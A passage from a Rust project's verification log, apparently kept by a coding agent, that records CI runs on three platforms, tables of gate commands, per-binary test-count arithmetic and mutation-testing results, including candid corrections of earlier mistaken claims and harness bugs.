is that **"this change is platform-independent" is itself a claim needing
evidence, and the only evidence is a run on the other platform.**

**The fix, and what it does and does not claim.** The Windows spellings are now
asserted per platform. On Windows they must be refused, as before. On Unix the
premise is asserted first — `!Path::new(name).is_absolute()`, so the test says
*why* accepting it is right instead of guessing — and then the function's
**contract** rather than a spelling: whatever comes back must be neither absolute
nor rooted.

That last choice is deliberate: the first draft of the fix asserted the exact
`Some(PathBuf::from(name))`, which is a guess about Rust's normalization made by
the same reasoning that produced the bug. Asserting the contract —
*the answer cannot leave the project* — is the statement that actually has to
hold, and it is the one a future refactor should be held to.

**Not verified on this machine, and this time it is written down before the push
rather than after.** `cargo clippy --target x86_64-unknown-linux-gnu` cannot run
here for `--workspace --all-targets`: `rusqlite`'s bundled SQLite needs
`x86_64-linux-gnu-gcc`, which is not installed, so the cross-target check the
environment notes describe is unavailable for anything that links the store. The
`#[cfg(unix)]` arm of this assertion therefore **has never been compiled or run
anywhere**, exactly like `link_to_directory`'s. The macOS and Ubuntu jobs are its
first execution, and the run has to be read rather than assumed.

### Reading run `34845282962`, `P2-T003`'s

Not the colour — the log. Four things were taken out of it:

- **The totals differ by platform, and two independent readings agree.** Windows
  **668** passed, Linux **671**, macOS **670**, with 0 failed and 1 ignored on
  each. Every job's log has 32 `test result:` lines, which is 18 binaries + 4
  doc-test targets + `store_concurrency`'s **10 children**; the children account
  for exactly 10 of the "passed" sum, and 678 − 10 = 668 is the figure the local
  Windows run printed as well. That agreement is what makes the Linux and macOS
  figures trustworthy rather than merely plausible.
- **The two new `#[cfg(unix)]` tests ran on both Unix jobs**, read by name:
  `a_link_is_recorded_by_where_it_points_and_never_read_through` and
  `a_pipe_in_the_project_is_refused_rather_than_opened` are `ok` in the Ubuntu
  and the macOS log, and absent from the Windows one. The second exists for the
  same anti-hang reason the Git kind's does, and it has now run somewhere.
- **The platform set difference is measured, and it is what was predicted.**
  Windows-only names: **8**, unchanged. Linux-only: **11** — the nine of
  `9f13f0d` plus the two above. Net **+3 on Linux**, and 668 + 3 = 671, which is
  the total the log printed. macOS against Windows is **12**, net **+2**, and
  668 + 2 = 670. The gate-set section predicted "+3"; it was right, and it was
  checked rather than left standing as a prediction.
- **Nothing was silently skipped on any platform.** Every test function in
  `fingerprint_content.rs` and `fingerprint_git.rs` was looked for **by name** in
  each of the three jobs' lists, and the only ones missing are that platform's
  `#[cfg]` gates — `23 + 2` on Unix and `43 + 4` on Windows. That is the check
  that would catch a target quietly running nothing, and it is the reason to
  count names rather than to read the summary lines.

`target/tmp/diff_names.py` (git-ignored, ad hoc) is the extractor. It reads
doctest lines as source paths, so its retained-name list carries a few junk
tokens; those are identical on every platform and cancel in the set difference,
but anyone reusing it should filter on the path separators rather than trust its
counts. The `23 + 2` and `43 + 4` above were counted from the source, not from
it.

The acceptance commit's own run is red. That is the fact this section exists for:
`P2-T002` was marked accepted, and `progress/state.json` says so, on a commit
whose CI failed — and the acceptance was sound only because none of the three
failures happened to touch the behaviour being accepted.

**The first fix was a guess and did not work; reading the log is what fixed it.**
`58b3793` was written from local reasoning about what could be wrong, touched the
three files that reasoning named, and pushed. The same three jobs failed again.
Reading `--log-failed` then named the causes exactly:

| Failure | The log's words | Why the local gate set cannot see it |
| --- | --- | --- |
| `preflight.sh` — the fix for SC1128 *introduced* SC1072/SC1073 | `Couldn't parse this shellcheck directive` | nothing on Windows runs `preflight.sh`; the shellcheck job is its only caller, and the file is one of the files its own last line checks. The new error came from a comment whose **first word** was the linter's own name |
| `scan_project.rs:272` on Linux | `assertion left == right failed` in `a_name_that_is_not_valid_unicode_...` | the assertion expected one U+FFFD; Unix decodes the bytes to three, by the maximal-subpart rule. `58b3793` had fixed this test's *gating* and left its *assertion* |
| `paths/compare.rs:440` on macOS | `the_platform_rule_is_applied_by_the_default_entry_point` | that test was under a bare `#[cfg(unix)]` asserting **Linux's** case rule. `unix` includes macOS, whose default volume is case-insensitive |

Two of the three are the same shape: **code gated to a set of platforms that is
not the set it is correct on.** `#[cfg(unix)]` is not "where this is used" and
not "where this is true"; it is a list of platforms, and the list that compiles a
helper and the list that can run it have to be the same list. The third was a
test asserting one platform's answer on another — the same mistake as the
second, arrived at independently.

A fourth defect was found in the same reading and is unrelated to platforms: a
path Git reports could **climb out of the project** (see "What the hardening
added" above). It is recorded here because the local gate set could not see it
either — nothing in it feeds a hostile repository to the fingerprint.

**The local Windows gate set structurally cannot substitute for CI**, and this
was established by trying rather than by reasoning: `cargo check -p sure-core
--target x86_64-unknown-linux-gnu` fails in `cc-rs` with *failed to find tool
"x86_64-linux-gnu-gcc"*, and this machine has no clang, gcc or zig. A stub `cc`
emitting empty objects was considered and **rejected**: it could make a real
failure look green, which is the one thing worse than a red build.

**What can be done locally about platform-gated code** — and was, for `9f13f0d` —
is to compile the *constructs* rather than the code: a throwaway file on the host
that uses the same expression shapes under `-D warnings`. That catches a
type error in a `#[cfg(unix)]` body; it does not catch a wrong *expectation*, and
nothing local can. Only a run on the platform can.

`docs/development/GITHUB_WORKFLOW.md` now carries the rule this produced —
**a push is not finished until its run has been read** — with two reading
consequences: `cargo test` in CI runs without `--no-fail-fast`, so a job's log
stops at the first failing target, and a green `windows-latest` job says nothing
whatsoever about the other two.

## Gate set, as run on the fix for run `34865716315`

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **877 passed, 0 failed, 1 ignored, across 36 result lines = 26 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| mutation check, 5 mutations over the new branches | **5 of 5 caught**, baseline green first; one printed `SKIP` on the first pass because its anchor appeared twice, and was re-anchored rather than counted |

**877 is 871 + 6, and the six are the tests this fix adds and nothing else.**
Measured, not predicted: the count was taken from the parent sections before the
fix was written and again after. The raw sum over all 36 lines is **887**, which
over-counts by exactly 10 for the reason recorded above.

The fix also ran `sure-core --test store_concurrency` **8 times** with no failure.
Recorded here so the number is not mistaken for evidence: a test that fails about
one run in five passing eight times is a smoke check, and the deterministic unit
test is what justifies the fix.

## Gate set, as run on `P3-T002`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | `FMT CLEAN` |
| `cargo check --workspace --all-targets` | `CHECK CLEAN` |
| `cargo clippy --workspace --all-targets -- -D warnings` | `CLIPPY CLEAN` |
| `node scripts/validate-bootstrap.mjs` | `SURE bootstrap validation OK: 17 phases, 166 tasks.` |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `cargo test --workspace --no-fail-fast` | **1087 passed, 0 failed, 9 ignored, across 43 result lines = 33 parent sections + 10 children** |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate18.py` | **32 of 32 observable mutations caught, 2 declared unobservable and both missed as declared, 0 SKIP, 0 BUILD**, baseline green first |

**The log again holds two full runs of the suite, and this time there is no
scare.** `Preflight-Windows.ps1` runs `cargo test` itself, so
`target/tmp/p3t002-preflight.log` contains both, and both report
**1087 / 0 / 9** with **1077** passed in parents — identical to the standalone
run and to CI Windows. The parent multiset is the same value for value:

```
0 0 0 0 2 4 4 5 6 6 7 7 7 8 8 9 12 14 15 18 20 23 24 28 30 30 31 33 43 46 48 88 501
```

**The mutation count went 33 → 34, and the one added mutation is the only one
whose subject is this task's own subject.** It replaces `Command::new(&self.program)`
with a `format!` that wraps the program in quotes, which is the plausible mistake
— a path with a space is the reason to quote, and the process API quotes the
program itself. The harness prints **at most three** caught names per mutation,
and the three it printed are
`a_batch_file_named_with_its_extension_runs_and_windows_brings_the_interpreter`,
`a_cancelled_run_is_stopped_before_its_deadline` and
`a_cancelled_run_reaches_what_it_started_too` — **the new test is not among
them**. So the question "does the test this task added catch the mutation this
task added" was answered by measurement rather than by reading the summary:
applied by hand,
`a_program_at_a_path_with_a_space_and_unicode_is_the_program_that_runs` **fails
alone in 0.01s with `os error 123`, `ERROR_INVALID_NAME`**, before any process is
started, and the mutation was reverted and `git status` read clean afterwards.
That is the third time this file has had to say the harness's output is a summary
and not the record.

**The two declared-unobservable mutations are unchanged and still declared:** no
test holds a stream open past `DRAIN_GRACE`, and no test can make `taskkill` exist
and fail. Neither is this task's, and neither was made observable by it — the
tree tests reach further into the tree than `P3-T001`'s did, but they still cannot
make a program exist and fail.

## Gate set, as run on `P3-T001`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | `FMT CLEAN` |
| `cargo check --workspace --all-targets` | `CHECK CLEAN` |
| `cargo clippy --workspace --all-targets -- -D warnings` | `CLIPPY CLEAN` |
| `node scripts/validate-bootstrap.mjs` | `SURE bootstrap validation OK: 17 phases, 166 tasks.` |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `cargo test --workspace --no-fail-fast` | **1082 passed, 0 failed, 7 ignored, across 43 result lines = 33 parent sections + 10 children** |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate18.py` | **31 of 31 observable mutations caught, 2 declared unobservable and both missed as declared, 0 SKIP, 0 BUILD**, baseline green first |

**This table is CI's command set, and the earlier tables in this file are one
command wider than CI is.** Every gate table above records clippy as
`--all-features`, and `.github/workflows/ci.yml:35` runs
`cargo clippy --workspace --all-targets -- -D warnings` with no such flag; CI
also runs `cargo check` and `validate-bootstrap.mjs`, which most of those tables
omit. The difference has never mattered — `grep -rn '^\[features\]' --include=Cargo.toml .`
finds no `[features]` section anywhere in the workspace, so `--all-features`
selects nothing that is not already selected — but a recorded command that is
not the command CI runs is the kind of thing this file exists to not leave
standing. This table is what CI runs; the older tables are what was run.

**The log holds two full runs of the suite, and this time they agree completely.**
`Preflight-Windows.ps1` runs `cargo test` itself, so `target/tmp/p3t001-gates.log`
contains **86** `test result:` lines — 66 parents and 20 children — and both runs
report **1082 / 0 / 7** with **1072** passed in parents. The two runs' parent
multisets are identical, value for value:

```
0 0 0 0 2 4 4 5 6 6 7 7 7 8 8 9 12 14 15 18 20 23 23 24 30 30 31 33 43 46 48 88 501
```

**A first reading of that log said the two runs disagreed — 10 children against
9 — and the reading was wrong, in a way worth recording because this repository
has now paid for it three times.** One child line arrives with its text
rearranged:

```
test result: ok; finished in 0.87s. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out
```

The counts are all present and correct; the `; finished in 0.87s.` clause has
landed between the `ok` and the counts, because the children `store_concurrency`
spawns inherit one stdout handle and write to it concurrently. A regex that
anchors on `test result: ok\.` — which is what libtest prints, every other time —
slides off that line and reports 42 result lines where there are 43. The tell is
that a *strict* pattern and a *loose* one (just the five counts) give different
numbers on the same file; matching on the counts alone gives 43 / 33 / 10 / 1082
on both runs. So the file's headline convention survived the scare: the parent
sum was 1072 in both runs and in CI, and it is the parent sum that is comparable.
This is the same failure as `cicheck.py`'s missing `--quiet` pattern and
`names.py`'s 7-line window: a matcher that matches nothing prints a well-formed
table of the wrong number.

**1072 is `P2-T011`'s 1040 + 32, and the parent multiset difference closes with
no remainder** — values that left, `4` and `495`; values that arrived, `2`, `5`,
`23` and `501`; net +32. Those four substitutions are the four things this task
added:

| Change | Binary | Delta |
| --- | --- | --- |
| the six `#[test]`s in `src/process/mod.rs` | `unittests src\lib.rs` (`sure-core`) | 495 → 501 (**+6**) |
| the one `no_run` example in `src/process/request.rs` | `Doc-tests sure_core` | 4 → 5 (**+1**) |
| `crates/sure-core/tests/process_runner.rs` | new binary | **23** (29 tests, 6 `#[ignore]`d) |
| `crates/sure-core/tests/spawn_sites.rs` | new binary | **2** |

The parent count went 31 → 33, **by exactly two** for the two new binaries. The
ignored count went 1 → 7, all six of the new ones inside `process_runner`'s
children. Windows CI reports the same multiset as this local run value for value;
that comparison, and the by-name platform gate behind it, are in the run-reading
section above.

## Gate set, as run on `P2-T011`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | `FMT CLEAN` |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | `CLIPPY CLEAN` |
| `cargo test --workspace --no-fail-fast` | **1040 passed, 0 failed, 1 ignored, across 41 result lines = 31 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate16.py` | **28 of 28 observable mutations caught, 2 declared unobservable and both missed as declared, 0 SKIP, 0 BUILD**, baseline green first |

**The gate log holds two full runs of the suite, and that is expected rather than
a doubling.** `Preflight-Windows.ps1` runs `cargo test` itself, so
`target/tmp/p2t011-gates.log` contains **82** `test result:` lines — 62 parents
and 20 children — and both runs report 1040 / 0 / 1. Recorded because a reader
who counts the lines in that file and gets twice the number in this table should
be able to find out why without re-running it.

**1040 is `cf7675d`'s 1019 + 21, attributed by binary name rather than only by
total.** Locally the multiset moved two positions: `unittests src\lib.rs` for
`sure-core` 481 → 495 (+14, the `intent_model` unit tests) and a **new** binary
`tests\intent_sources.rs` at 7. The local Windows multiset is the CI Windows
multiset for this commit value for value — `0 0 0 0 4 4 4 6 6 7 7 7 8 8 9 12 14
15 18 20 23 24 30 30 31 33 43 46 48 88 495`. The result-line count went 40 → 41
and the parent count 30 → 31, **by exactly one**.

**The harness records test names now, which is what the two re-runs were for.**
`mutate16.py` was corrected before this acceptance: it had collected its "fired"
evidence with a pattern that `cargo test --quiet` cannot produce, so what it
printed under `CAUGHT` was a per-binary `test result: FAILED.` summary under a
heading that read as a list of tests. The verdicts are unaffected — `CAUGHT`
turned on that list being non-empty, and a summary line can only come from a
harness that ran and failed — but the evidence was wrong, and the run recorded
here is the one whose `CAUGHT` lines are followed by the names of the tests that
failed, read out of libtest's `failures:` list. The same correction was made to
`mutate15.py`, and its own re-run is the next section.

## The `P2-T009` harness, re-run on the corrected evidence parser

| Command | Result |
| --- | --- |
| `python target/tmp/mutate15.py` (corrected) | **35 of 35 observable mutations caught, 2 declared unobservable and both missed as declared, 0 SKIP, 0 BUILD**, baseline green first |

**This run is on `73da9a6` and not on `b644462`, and the reason it still speaks
for `P2-T009` is checkable rather than assumed.** `git diff --name-only cf7675d
73da9a6` names five files — `intent_model.rs`, `lib.rs`, `intent_sources.rs`,
`PROJECT_INTENT.md` and `state.json` — so **`documents.rs` and `references.rs` are
byte-identical between `P2-T009`'s accepted revision and the revision this ran
on**. Those two files are the ones every one of the 37 mutations aims at, which
is what makes the verdict transfer. The condition that would break the
reasoning is a later commit touching either file, and the mutation count would
then have to be re-derived rather than re-used.

The verdict is the same one `P2-T009` was accepted on — 35 of 35 observable, 2
declared unobservable — so the correction changed the evidence and not the
conclusion, which is the only outcome that would have justified leaving the
earlier record as it was. **Both harnesses also gained a pre-flight refusal since
`P2-T009` ran**: they will not start if the tree already looks mutated, because a
harness stopped by a signal leaves its mutation applied (`apply()`'s `finally`
covers an exception and not the process being killed) and one was found on disk
only by re-checking anchors by hand.

## Gate set, as run on `P2-T009`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all --check` | `FMT CLEAN` |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace` | **1019 passed, 0 failed, 1 ignored, across 40 result lines = 30 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate15.py` | **35 of 35 observable mutations caught, 2 declared unobservable and both missed as declared, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` fired on the first run rather than on this one |

**1019 is `cd530f6`'s 963 + 56, and the 56 is attributed by binary name rather
than only by total.** Locally the multiset moved two positions: `unittests
src\lib.rs` for `sure-core` 445 → 481 (+36, the `documents` unit tests), and a
**new** binary `tests\document_commands.rs` at 20. The local Windows multiset is
the CI Windows multiset for this commit value for value —
`0 0 0 0 4 4 4 6 6 7 7 8 8 9 12 14 15 18 20 23 24 30 30 31 33 43 46 48 88 481`.

The result-line count went 39 → 40 and the parent count 29 → 30, **by exactly
one**, which is the check that the +20 is one new test binary and not twenty
functions scattered into existing ones. The 40 lines are 30 parents + 10 children;
the children are the self-re-executing single-test runs, and the field that
identifies a parent is `filtered out` — the **last** number on the `test result:`
line — not `failed`. Grouping on `failed` was tried once in this session and made
every row look like a parent.

**This harness's first run was not clean, and it failed in the one way the
baseline check exists to catch: the suite was red before a single mutation was
applied.** `a_pass_that_has_read_its_byte_budget_refuses_the_rest` failed
unmutated, so no verdict below it would have meant anything. The test encoded a
*predictive* byte budget while this module and the accepted `references.rs` both
check whether the budget is **already spent**. With a 30-byte budget and a
21-byte first document, nothing can refuse the second, so the test could never
pass — the arithmetic, not the assertion, was wrong. The fix went to the test and
not to the code, because `references.rs` is accepted with the already-spent
reading pinned by `the_byte_budget_stops_the_pass_before_the_file_budget_does`
and by the same sentence in `UnreadReason::OutOfBytes`; **two passes that both
say "had already read" must not come to mean two things.** The test now computes
its budget from the document instead of using a round number and asserts that
the *third* of three documents is the one refused.

That failure also falsified a claim made earlier in the same session — "all gates
green, 1017 passed / 0 failed" — which had been measured **before** those two
budget tests were written and was then carried forward unmeasured. The number
was not wrong when it was taken; it was stale when it was repeated, which is a
distinction that does not help a reader who acts on it.

The second finding was a survivor rather than a failure: one observable mutation
was not caught, and it aimed at `command_from`'s `if text.is_empty()` guard. The
guard **can never fire**, because `trimmed` comes from `raw.trim()` and a line
that is only `$` has already lost the space before `strip_prefix("$ ")` is
asked, and every line that does match keeps a non-whitespace character after the
space or `trim` would have removed it. The test written to pin that guard —
`a_prompt_with_nothing_after_it_is_not_a_command` — passed for a different reason
than its name said, which is the failure mode `CLAUDE.md` ranks below a visible
error. The guard was **removed rather than declared unobservable**, following
`P2-T008`'s precedent for the `symlink_metadata` guard that was not added for the
same reason, and the mutation now aims at the `trim` instead so that the
invariant has something pointing at it.

## Gate set, as run on `P2-T008`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all --check` | `FMT CLEAN` |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace` | **963 passed, 0 failed, 1 ignored, across 39 result lines = 29 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate14.py` | **21 of 21 observable mutations caught, 3 declared unobservable and all 3 missed as declared, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` did not fire |

**963 is `481066f`'s 960 + 3, and the 3 are attributed by binary name rather than
only by total.** Locally the multiset moved two positions: `unittests src\lib.rs`
for `sure-core` 443 → 445, and `tests\config_references.rs` 17 → 18. The local
Windows multiset is character-for-character the CI Windows multiset —
`0 0 0 0 4 4 4 6 6 7 7 8 8 9 12 14 15 18 23 24 30 30 31 33 43 46 48 88 445` —
which is a stronger statement than the totals agreeing.

The result-line count stayed at 39 because no new test binary was added in this
step: the two unit tests went into a binary that already existed, as did the one
integration test. That is the check that the +3 is three test functions and not a
new target.

**This harness's first run was not clean and is recorded rather than discarded.**
It reported 1 `SKIP`, 1 `BUILD`, and 4 `MISSED`, and all four holes were real:

- The `SKIP` was an anchor that `cargo fmt` had reformatted — a `boolean && chain`
  that `mutate14.py` had written across two lines and the formatter had collapsed
  onto one. **The mutation was therefore never applied, and the only sign was the
  word `SKIP`.** Had the harness counted a non-application as a catch, or had the
  anchor been silently treated as satisfied, this would have read as a passing
  mutation list with one entry never tested.
- The `BUILD` was a `while let` → `if let` rewrite that left `end` unbound. It
  compiled only after binding the variable; a non-zero exit with no `FAILED` line
  says nothing about whether a test would have noticed the behaviour, which is why
  `BUILD` is kept out of the caught count rather than folded into it.
- Three mutations survived and were closed with tests rather than reclassified:
  a `+`-concatenated argument written **without** a space (`"API_"+SUFFIX`, which
  the spaced spelling hides because the space alone rejects it), a quoted argument
  that is not a name at all (`""`, `"not a key"`, `"1BAD"`), and the sentence's
  declared count. The third is the one worth noting: the sentence test asserted
  only `starts_with("SURE found 0")`, so a mutation making the sentence report
  *every* key as declared was invisible.
- The fourth survivor, removing `found.sort()` in `candidates`, is **unobservable
  for a reason that lives in another module**, and it is declared as such with the
  reason written down: `Scan::files` already yields paths in that order, because
  `scan::Walk` sorts each directory's children by name (`scan/mod.rs:465`) and
  recurses into a subdirectory inline (`scan/mod.rs:515`), and pre-order
  depth-first over name-sorted siblings is component-lexicographic order, which is
  what `Path`'s `Ord` compares. The sort duplicates a guarantee this module does
  not own, which is why it stays — and the declaration states the condition that
  would falsify it.

## Gate set, as run on `P2-T012`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets -- -D warnings` | clean |
| `cargo test --workspace` | **920 passed, 0 failed, 1 ignored, across 38 result lines = 28 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh -NoProfile -File scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |
| `python target/tmp/mutate13.py` | **22 of 22 observable mutations caught, 1 declared unobservable and missed as declared, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` did not fire |

**920 is `4746c48`'s 907 + 13, and the 13 are attributed by binary name rather
than only by total** — the same three-way reconciliation `P2-T010` established,
now run the other way round. Locally the multiset moved four positions:
`sure_core` 416 → 420, `sure_domain` 87 → 88, `wire_contract` 29 → 30, and a new
`7`. **The local Windows multiset is character-for-character the CI Windows
multiset** — `420 88 48 46 43 33 31 30 30 24 23 15 14 12 9 8 8 7 7 6 6 4 4 4 0 0 0 0`
— which is a stronger statement than the totals agreeing and is available
because the harness prints the whole sorted list. Counting `test result:` lines
alone would have given 930, which over-counts by exactly 10 for the reason
recorded above.

The result-line count moved from 37 to 38 because `support_levels.rs` is a new
test binary, so the parents went from 27 to 28. The four file-level counts match
the four multiset positions: four unit tests in `support.rs`, one in
`vocabulary.rs`, one added to `wire_contract.rs`, seven in the new integration
binary.

## Gate set, as run on `P2-T010`'s implementation commit

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **907 passed, 0 failed, 1 ignored, across 37 result lines = 27 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `python target/tmp/mutate12.py` | **21 of 21 observable mutations caught, 2 declared unobservable and missed as declared, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` did not fire |

**907 is 877 + 30, and 877 is the Windows figure this file already recorded for
`3be88f1`** — the commit this work starts from — so the arithmetic does not have
to cross the migration-race fix in the middle. The thirty are: twelve in
`sure-cli`'s binary (nine in `check.rs`, two in `report.rs`, one in
`commands.rs`), one in `cli_contract.rs`, nine in `sure-core`'s lib
(`project_intent.rs`), and eight in the new `project_intent_ingest` binary.
Counting `test result:` lines alone would have given 917, which over-counts by
exactly 10 for the reason recorded above.

The result-line count moved from 36 to 37 because `project_intent_ingest.rs` is a
new test binary, so the parents went from 26 to 27. The per-binary multiset — the
only sound way to attribute a count to a target — is now
`416, 87, 48, 46, 43, 33, 31, 30, 29, 24, 23, 15, 14, 12, 9, 8×2, 7, 6×2, 4×3, 0×4`:
27 values for 27 expected binaries. Against `586d3a3`'s
`401, 87, 46, 43, 36, 33, 31, 30, 29, 24, 23, 15, 13, 12, 9, 8, 7, 6×2, 4×3, 0×4`,
three positions moved and one is new: the CLI binary 36 → 48, `cli_contract` 13 →
14, a new `8` for the new integration test, and the lib 401 → 416 — that last
being +6 from the migration-race fix that landed between the two runs and +9 from
this one.

**That local attribution was then confirmed by CI, binary by binary**, which is
worth recording because it is the first time the two methods have been compared
directly rather than used one at a time. Locally the multiset said the CLI binary
gained 12, the lib 9, `cli_contract` 1, and a new binary 8; CI read the same four
numbers out of the `Running` lines by name, against a different baseline run.
The local figures for the CLI binary and the lib also agree with the file-level
count — nine in `check.rs` plus two in `report.rs` plus one in `commands.rs` is
twelve — so the same delta is now reachable three ways, and "Reading run
`34869888350`" records what each of them can and cannot support.

## Gate set, as run on the `P2-T007` commit `586d3a3`

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **871 passed, 0 failed, 1 ignored, across 36 result lines = 26 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `python target/tmp/mutate11.py` | **20 of 20 observable mutations caught, 0 declared unobservable, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` did not fire |

**871 is 849 + 22 and 401 is 383 + 18, and the two numbers are different on
purpose.** The lib gains 18: sixteen module tests plus the two added to close the
mutation holes. The workspace gains 22: those 18, plus the four in the new
`components_graph` integration test binary. Counting `test result:` lines alone
would have given 881, which over-counts by exactly 10 for the reason recorded
above — the figure to report is the sum over the 26 parent sections.

The result-line count itself moved from 35 to 36 because `components_graph.rs` is
a new test binary, so the parents went from 25 to 26. The per-binary multiset —
the only sound way to attribute a count to a target — is now
`401, 87, 46, 43, 36, 33, 31, 30, 29, 24, 23, 15, 13, 12, 9, 8, 7, 6×2, 4×3, 0×4`:
26 values for 26 expected binaries, with `401` appearing exactly once and `4×3`
where it was `4×2` before, which is the new binary and nothing else.

## Gate set, as run on the `P2-T006` tests commit `9c6e08d`

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **849 passed, 0 failed, 1 ignored, across 35 result lines = 25 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `python target/tmp/mutate10.py` | **32 of 32 observable mutations caught, 2 declared unobservable, 0 SKIP, 0 BUILD**, and `BASELINE IS NOT GREEN` did not fire |

**849 is 840 + 9 and 383 is 374 + 9, both measured rather than predicted** — the
nine are the `pattern.rs` tests and nothing else, which is the arithmetic a
commit that claims to add only tests has to come back with. The raw sum over all
35 lines is **859**, which over-counts by exactly 10 for the reason recorded
above; the figure to report is the sum over the 25 parent sections.

**The important line is the last one, and it is not the mutation count.** The
harness now runs the suite unmutated first and refuses to report anything if it
is not green. That check exists because its absence produced a run in which every
mutation was `CAUGHT` and the verdicts meant nothing — the details are under
"What the second `P2-T006` commit added". A gate set is only as good as the
question *what would this have looked like if it were wrong*, and this is the
second time on this branch that the answer was "exactly the same".

## Gate set, as run at `9c931d0` (`P2-T006`)

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **840 passed, 0 failed, 1 ignored, across 35 result lines = 25 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `python target/tmp/mutate10.py` | **26 of 26 observable mutations caught, 1 declared unobservable, 0 SKIP, 0 BUILD** |

Per binary on this platform: `sure-cli` 36 **bin** + 13 `cli_contract`;
`sure-core` **374 lib** + 9 `config_loading` + 33 `discover_node` + 31
`discover_python` + **24 `discover_rust`** + 6 `doctor` + 23 `fingerprint_content`
+ 43 `fingerprint_git` + 30 `scan_project` + 6 `store_concurrency` + 4
`store_packaging`; `sure-domain` 87 lib + 29 `wire_contract`; `sure-protocol` 46
lib + 12 `conformance` + 15 `round_trip`; `sure-testkit` 0 lib + 7
`integration_thinness` + 8 `repository_shape`; `Doc-tests sure_core` **4**. That
is 49 + 583 + 116 + 73 + 15 + 4 = 840.

**The arithmetic against 786 at `e10f620` is +54, and both parts are counted
rather than inferred from the total**: **+30 `#[test]`** in `rust.rs`, which is
the whole of the lib movement 344 → 374, and **+24** for the new `discover_rust`
target, which is the **21st test binary** and takes the parent sections from 24 to
25. 30 + 24 = 54, and `pattern.rs`, `mod.rs`, `node.rs` and `discover_node.rs`
added **zero** — all four are in the diff and a file being touched is not a test
being added.

**Those per-binary figures were confirmed against the CI log rather than left as a
derivation**, and the way it was done is worth keeping because it is the one
per-target attribution that *is* sound on CI. Proximity is invalid (see above),
but the **multiset** of result counts is not: take every `test result: ok. N
passed` line in a job, and compare the multiset of `N` against the per-binary
counts expected from the local run. On Windows the multiset came back as
`374, 87, 46, 43, 36, 33, 31, 30, 29, 24, 23, 15, 13, 12, 9, 8, 7, 6×2, 4×2, 0×4`
— **25 values, matching the 25 expected binaries one for one**, with `374` and
`24` each appearing exactly once, which is what a unique attribution needs. It is
still not proof, because two binaries could in principle share a count; it is a
consistency check, and it is a far stronger one than a colour.

## Gate set, as run at `e10f620` (`P2-T005`)

| Command | Result |
| --- | --- |
| `cargo fmt --all -- --check` | clean |
| `cargo clippy --workspace --all-targets --all-features -- -D warnings` | clean |
| `cargo test --workspace --no-fail-fast` | **786 passed, 0 failed, 1 ignored, across 34 result lines = 24 parent sections + 10 children** |
| `node scripts/taskctl.mjs validate` | `state OK: 166 tasks` |
| `pwsh scripts/Preflight-Windows.ps1` | `SURE Windows preflight passed.` |

Per binary on this platform: `sure-cli` 36 **bin** + 13 `cli_contract`;
`sure-core` **344 lib** + 9 `config_loading` + 33 `discover_node` + **31
`discover_python`** + 6 `doctor` + 23 `fingerprint_content` + 43
`fingerprint_git` + 30 `scan_project` + 6 `store_concurrency` + 4
`store_packaging`; `sure-domain` 87 lib + 29 `wire_contract`; `sure-protocol` 46
lib + 12 `conformance` + 15 `round_trip`; `sure-testkit` 0 lib + 7
`integration_thinness` + 8 `repository_shape`; `Doc-tests sure_core` **4**. That
